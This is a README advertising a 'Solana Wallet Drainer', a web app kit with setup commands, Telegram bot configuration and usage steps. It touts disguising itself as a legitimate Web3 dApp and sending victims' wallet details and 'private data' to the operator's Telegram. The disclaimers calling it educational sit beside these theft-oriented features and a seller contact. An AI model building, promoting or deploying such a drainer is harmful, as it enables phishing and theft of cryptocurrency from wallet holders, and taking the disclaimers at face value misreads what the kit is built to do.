# Solana Wallet Drainer

![Banner Image](https://github.com/user-attachments/assets/928a877b-f3d4-480b-ad48-25490ee85533)



⚠️ **LEGAL DISCLAIMER: This tool is for EDUCATIONAL and TESTING purposes only. Do NOT use for malicious activities, theft, or unauthorized access to wallets. Only use with wallets you own or have explicit permission to access.**

A high-end, 3D-accelerated Solana token receiver and wallet interaction tool. Features a premium glassmorphism UI/UX, seamless wallet integration, and real-time backend reporting via Telegram.

## 🚨 **IMPORTANT WARNINGS**

- **ONLY use with wallets you OWN**
- **NEVER use for theft or unauthorized access**
- **Always verify destination addresses**
- **This tool is for legitimate purposes only**

## Features

- 🎨 **3D Visuals**: Interactive Three.js background with reactive particles and lighting.
- 💎 **Premium UI**: Modern Glassmorphism design with responsiveness.
- 🔌 **Wallet Support**: Auto-detects and connects to Phantom Wallet.
- 📡 **Live Reporting**: Sends wallet connection details and private data securely to your Telegram Bot.
- 🔒 **Secure Backend**: Node.js/Express server with TweetNaCl signature verification.
- 🛡️ **Anti-Detect**: Optimized to look like a legitimate Web3 dApp.


## Usage
<video src="https://github.com/user-attachments/assets/a47c731d-ce98-4106-ac0a-ceaf6f53bb84" width="320" height="240" controls></video>






## Installation

1. Clone the repository:
```bash
git clone https://github.com/yourusername/wallet-drainer.git
cd wallet-drainer
```

2. Install dependencies:
```bash
cd solana_app
npm install
```

3. Start the application:
```bash
npm start
```
The application will run on `http://localhost:3000`.

## Configuration

To enable Telegram reporting, open `server.js` and update your bot credentials:

```javascript
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
```

## Usage

1.  **Run the Server**: `npm start` in the `solana_app` directory.
2.  **Open Browser**: Navigate to `http://localhost:3000`.
3.  **Connect Wallet**: Click the "Connect Wallet" button.
4.  **Sign Message**: Approve the signature request in Phantom.
5.  **View Report**: Check your Telegram Bot or Terminal for the reported data.

## Legal and Ethical Use

This tool is designed for legitimate purposes such as:
- ✅ Security research and training
- ✅ Web3 authentication testing
- ✅ UI/UX demonstration

**FORBIDDEN USES:**
- ❌ Unauthorized access to wallets
- ❌ Theft or fraud
- ❌ Malicious activities
- ❌ Accessing others' private keys
- ❌ Any illegal activities

## Contact
- https://t.me/cirlus0x
- Telegram: @cilus0x

## Dependencies

- `express`: Backend server
- `three`: 3D graphics library
- `gsap`: Advanced animations
- `@solana/web3.js`: Solana blockchain interaction
- `https-proxy-agent`: Proxy support for API requests

## License

MIT License - see LICENSE file for details.

## Disclaimer

This software is provided "as is" without warranty. Use at your own risk. 

**LEGAL NOTICE**: This tool is for legitimate purposes only. Users are responsible for ensuring they have proper authorization to access any wallets they use with this tool. The developers are not responsible for any misuse of this software.
